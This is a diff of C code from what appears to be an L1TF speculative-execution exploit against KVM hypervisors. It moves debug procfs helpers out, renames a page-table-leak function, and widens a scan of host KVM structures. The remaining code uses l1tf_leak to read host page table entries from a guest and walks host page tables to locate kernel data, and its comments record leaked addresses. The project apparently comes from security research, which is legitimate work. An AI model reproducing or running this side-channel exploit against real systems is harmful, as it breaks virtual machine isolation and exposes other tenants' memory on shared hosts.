@@ -17,61 +17,12 @@
 #include "timing.h"
 #include "reverse.h"
 #include "benchmark.h"
+#include "leak.h"
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/mman.h>
 #include <fcntl.h>
 
-#define STR(a) STRSTR(a)
-#define STRSTR(a) #a
-#define dump(x) printf("%30s = %16lx\n", STR(x), x)
-#define dumpp(x) printf("\t%30s = %16lx\n", STR(x), x)
-
-#define BITS_MASK(n, m) ( ((1ULL << n) - 1) & (~((1ULL << m) - 1)) )
-#define PFN_MASK BITS_MASK(52, 12)
-#define BITS(x, n, m) ((x & BITS_MASK(n, m)) >> m)
-
-#define IS_HUGE(pte) (pte & (1ULL << 7))
-
-uint64_t file_read_lx(const char *filename)
-{
-    char buf[32];
-    int fd = open(filename, O_RDONLY); if (fd < 0) { printf("error open %s", filename); exit(1); }
-    int rv = read(fd, buf, 32);  if (rv < 0) { printf("error read %s", filename); exit(1); }
-    int cv = close(fd); if (cv < 0) { printf("error close %s", filename); exit(1); }
-    return strtoull(buf, NULL, 16);
-}
-
-static uint64_t file_write_lx(const char *filename, uint64_t uaddr)
-{
-    char buf[32];
-    snprintf(buf, sizeof(buf), "%lx\n", uaddr);
-    int fd = open(filename, O_WRONLY); if (fd < 0) { printf("error open %s", filename); exit(1); }
-    u64 rv = write(fd, buf, 32);
-    int cv = close(fd); if (cv < 0) { printf("error close %s", filename); exit(1); }
-    return rv;
-}
-
-uintptr_t procfs_direct_map(void)
-{
-    return file_read_lx("/proc/preload_time/direct_map");
-}
-
-uintptr_t procfs_pgd(void)
-{
-    return file_read_lx("/proc/preload_time/pgd");
-}
-
-uintptr_t procfs_get_physaddr(gva_t uaddr)
-{
-    file_write_lx("/proc/preload_time/phys_addr", uaddr);
-    return file_read_lx("/proc/preload_time/phys_addr");
-}
-
-u64 procfs_get_data(gva_t addr)
-{
-    return file_write_lx("/proc/preload_time/data", addr);
-}
 
 uintptr_t get_feeling_translate_va(uintptr_t l0_pa, uintptr_t va)
 {
@@ -180,13 +131,13 @@ hpa_t get_feeling_translate_gva(gva_t va, hpa_t gcr3, hpa_t eptp)
 
 hpa_t leak_translation(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp);
 
-pte_t leak_pte(hpa_t base, hpa_t pa, hpa_t eptp)
+pte_t leak_pte_old(hpa_t base, hpa_t pa, hpa_t eptp)
 {
 	pte_t pte;
 	do {
 		for (int i = 0; i < 7; i++)
 			l1tf_leak((char *)&pte, base, pa, sizeof(u64));
-		printf("leak_pte: %lx\n", pte);
+		printf("leak_pte_old: %lx\n", pte);
 	// } while (!((pte & 0x7ff8000000000ffbULL) == 0x63)); // normal
 	} while (!((pte & 0x3ULL) == 0x3)); // ept
 
@@ -220,14 +171,14 @@ hpa_t leak_translation(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp)
 	// Level 0 -- Page Global Directory.
 	hpa_t pgdp = page_table + 8 * BITS(va, 48, 39);
 	dump(pgdp);
-	pte_t pgd = leak_pte(base, pgdp, eptp);
+	pte_t pgd = leak_pte_old(base, pgdp, eptp);
 	dump(pgd);
 	page_table = pgd & PFN_MASK;
 
 	// Level 1 -- Page Upper Directory.
 	hpa_t pudp = page_table + 8 * BITS(va, 39, 30);
 	dump(pudp);
-	pte_t pud = leak_pte(base, pudp, eptp);
+	pte_t pud = leak_pte_old(base, pudp, eptp);
 	dump(pud);
 	if (IS_HUGE(pud)) {
 		hpa_t pa = (pud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
@@ -239,7 +190,7 @@ hpa_t leak_translation(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp)
 	// Level 2 -- Page Middle Directory.
 	hpa_t pmdp = page_table + 8 * BITS(va, 30, 21);
 	dump(pmdp);
-	pte_t pmd = leak_pte(base, pmdp, eptp);
+	pte_t pmd = leak_pte_old(base, pmdp, eptp);
 	dump(pmd);
 	if (IS_HUGE(pmd)) {
 		hpa_t pa = (pmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
@@ -251,7 +202,7 @@ hpa_t leak_translation(hpa_t base, va_t va, hpa_t cr3, hpa_t eptp)
 	// Level 3 -- Page Table Entry.
 	hpa_t ptep = page_table + 8 * BITS(va, 21, 12);
 	dump(ptep);
-	pte_t pte = leak_pte(base, ptep, eptp);
+	pte_t pte = leak_pte_old(base, ptep, eptp);
 	dump(pte);
 	hpa_t pa = (pte & PFN_MASK) | BITS(va, 12, 0);
 	dump(pa);
@@ -424,7 +375,7 @@ void get_feeling_for_kernel_kvm_data_structures(void)
 	#define KVM_RAD 0x10
 	uintptr_t kvm = hc_read_va(kvm_vcpu);
 	dump(kvm);
-	for (int off = 0; off < 0x100; off += 8) {
+	for (int off = 0; off < 0x2000; off += 8) {
 		u64 data = hc_read_va(kvm+off);
 		printf("kvm+%4x = %16lx  -->  %16lx %16lx %16lx\n", off, data, hc_read_va(data), hc_read_va(data+8), hc_read_va(data+16));
 	}
@@ -944,19 +895,19 @@ void reverse_host_kernel_data_structures(void)
 	// leak_translation(l0_pa = 111cf6000, va = ffff9584f2d71000)
 	//                l0_pa =        111cf6000
 	//               pgd_pa =        111cf6958
-	// leak_pte: 100000067
+	// leak_pte_old: 100000067
 	//                  pgd =        100000067
 	//                l1_pa =        100000000
 	//               pud_pa =        100000098
-	// leak_pte: 100263067
+	// leak_pte_old: 100263067
 	//                  pud =        100263067
 	//                l2_pa =        100263000
 	//               pmd_pa =        100263cb0
-	// leak_pte: 6057fbd067
+	// leak_pte_old: 6057fbd067
 	//                  pmd =       6057fbd067
 	//                l3_pa =       6057fbd000
 	//               pte_pa =       6057fbdb88
-	// leak_pte: 800000013354d063
+	// leak_pte_old: 800000013354d063
 	//                  pte = 800000013354d063
 	//                   pa =        13354d000
 	// uintptr_t kvm_pa = 0x13354d000;
